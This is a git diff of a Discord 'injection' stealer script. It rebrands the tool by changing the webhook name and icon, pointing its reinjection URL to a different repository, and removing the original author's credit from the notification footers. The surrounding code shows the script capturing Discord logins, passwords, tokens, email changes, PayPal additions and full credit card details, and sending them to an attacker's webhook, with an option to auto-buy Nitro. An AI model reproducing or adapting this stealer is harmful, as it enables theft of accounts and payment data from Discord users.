@@ -10,10 +10,10 @@ const config = {
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@here", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: "Pegasus Injection", //name of the webhook thats gonna send the info
-  embed_icon: "https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_name: "CortésFamily", //name of the webhook thats gonna send the info
+  embed_icon: "https://cdn.discordapp.com/attachments/1041182399096180869/1090814098440200324/jesus.jpg".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js", //injection url for when it reinjects
+  injection_url: "https://github.com/DevAleenas/skafnaskfalksfmalm/edit/main/inject.js", //injection url for when it reinjects
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
     boost: {
@@ -342,7 +342,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection Completed",
         },
       },
     ],
@@ -384,7 +384,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection Completed",
         },
       },
     ],
@@ -426,7 +426,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection Completed",
         },
       },
     ],
@@ -468,7 +468,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection Completed",
         },
       },
     ],
@@ -510,7 +510,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection Completed",
         },
       },
     ],
@@ -554,7 +554,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection",
+          text: "🎉・Discord Injection Completed",
         },
       },
     ],
